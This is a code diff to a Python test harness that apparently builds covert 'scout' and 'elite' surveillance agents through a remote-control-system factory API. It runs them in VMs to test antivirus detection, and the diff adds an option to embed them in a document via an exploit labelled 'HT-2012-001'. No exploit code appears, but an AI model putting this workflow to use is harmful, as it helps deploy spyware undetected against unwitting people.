@@ -6,6 +6,8 @@ import socket
 import urllib2
 import zipfile
 import os.path
+import re
+import traceback
 
 import subprocess
 import Queue
@@ -25,14 +27,14 @@ MOUSEEVENTF_LEFTDOWN = 0x0002 # left button down
 MOUSEEVENTF_LEFTUP = 0x0004 # left button up 
 MOUSEEVENTF_CLICK = MOUSEEVENTF_LEFTDOWN + MOUSEEVENTF_LEFTUP
 
-def unzip(filename):
+def unzip(filename, fdir):
     zfile = zipfile.ZipFile(filename)
     names = []
     for name in zfile.namelist():
         (dirname, filename) = os.path.split(name)
-        print "- Decompress: " + filename 
-        zfile.extract(name, 'build')
-        names.append('build/%s' % name)
+        print "- Decompress: %s / %s" % (fdir, filename) 
+        zfile.extract(name, fdir)
+        names.append('%s/%s' % (fdir, name))
     return names
 
 def check_internet(address, queue):
@@ -152,7 +154,8 @@ class VMAVTest:
 
             with open(config) as f:
                 conf = f.read()
-            conf = conf.replace('$(HOSTNAME)', self.host[1])
+            #conf = conf.replace('$(HOSTNAME)', self.host[1])
+            conf =  re.sub(r'"host": ".*"',r'"host": "%s"' % self.host[1], conf)
             c.factory_add_config(factory_id, conf)
 
             #print "open config to write"
@@ -197,12 +200,19 @@ class VMAVTest:
                 'melt' : {}
             }
 
+            params['exploit'] = {"generate": 
+                {"platforms": ["windows"], "binary": {"demo": False, "admin": False}, "exploit":"HT-2012-001", 
+                "melt":{"demo":False, "scout":True, "admin":False}}, "platform":"exploit", 
+                "melt":{"combo":"txt", "filename":"example.txt", "appname":"agent.exe", 
+                "input":"000"}, "factory":{"_id":"000"}
+            }
+
             param = params[self.platform]
 
             #{"admin"=>false, "bit64"=>true, "codec"=>true, "scout"=>true}
             try:
                 
-                filename = 'build/build.zip'
+                filename = 'build/%s/build.zip' % self.platform
                 if os.path.exists(filename):
                     os.remove(filename)
 
@@ -213,12 +223,13 @@ class VMAVTest:
                     print "- Silent build"
                     r = c.build(factory, param, filename)
 
-                contentnames = unzip(filename)
+                contentnames = unzip(filename, "build/%s" % self.platform)
                 #print "contents: %s" % contentnames
 
                 print "+ SUCCESS SCOUT BUILD"
                 return [n for n in contentnames if n.endswith('.exe')]
             except Exception, e:
+                print "DBG trace %s" % traceback.format_exc()
                 print "+ FAILED SCOUT BUILD"
                 raise e
         
@@ -234,6 +245,7 @@ class VMAVTest:
             subp = subprocess.Popen([exe])
             print "+ SUCCESS SCOUT EXECUTE"
         except Exception, e:
+            print "DBG trace %s" % traceback.format_exc()
             print "+ FAILED SCOUT EXECUTE"
             raise e
 
@@ -405,20 +417,25 @@ class VMAVTest:
 
         if not os.path.exists('build'):
             os.mkdir('build')
+        if not os.path.exists('build/%s' % self.platform):
+            os.mkdir('build/%s' % self.platform)
         target_id, factory_id, ident = self._create_new_factory( operation, target, factory, config)
 
         print "- Built"
 
         meltfile = None
         if self.kind == 'melt':
-            meltfile = 'assets/meltapp.exe'
+            if self.platform == 'exploit':
+                meltfile = 'assets/meltexploit.txt'
+            else:
+                meltfile = 'assets/meltapp.exe'
 
         exe = self._build_agent( factory_id, meltfile )
 
         return factory_id, ident, exe
 
-def execute_agent(args, level):
-    ftype = args.platform_type[args.platform]
+def execute_agent(args, level, platform):
+    ftype = args.platform_type[platform]
     print "DBG ftype: %s" % ftype
 
     """ starts a scout """
@@ -430,10 +447,10 @@ def execute_agent(args, level):
     print "- Network unreachable"
 
     print "- Server: %s/%s %s" % (args.backend,args.frontend, args.kind)
-    vmavtest = VMAVTest( args.backend, args.frontend , args.platform, args.kind, ftype, args.blacklist )
+    vmavtest = VMAVTest( args.backend, args.frontend , platform, args.kind, ftype, args.blacklist )
 
     if vmavtest.create_user_machine():
-        print "+ SUCCESS USER CREATE"
+        print "+ SUCCESS USER CONNET"
         if not vmavtest.server_errors():
             print "+ SUCCESS SERVER CONNECT"
         
@@ -446,15 +463,20 @@ def execute_agent(args, level):
 
 def elite(args):
     """ starts a scout """
-    execute_agent(args, "elite")
+    execute_agent(args, "elite", args.platform)
 
 def scout(args):
     """ starts a scout """
-    execute_agent(args, "scout")
+    execute_agent(args, "scout", args.platform)
 
 def pull(args):
     """ starts a scout """
-    execute_agent(args, "pull")
+    if args.platform == "all":
+        for platform in args.platform_type.keys():
+            print "pulling platform"
+            execute_agent(args, "pull", platform)
+    else:
+        execute_agent(args, "pull", args.platform)
 
 def test(args):
     connection.host = "rcs-minotauro"
@@ -475,7 +497,7 @@ def clean(args):
     vmavtest._delete_targets(operation)
    
 def main():
-    platform_desktop = [ 'windows', 'linux', 'osx' ]
+    platform_desktop = [ 'windows', 'linux', 'osx', 'exploit' ]
     platform_mobile =  [ 'android', 'blackberry', 'ios' ]
 
     platform_type = {}
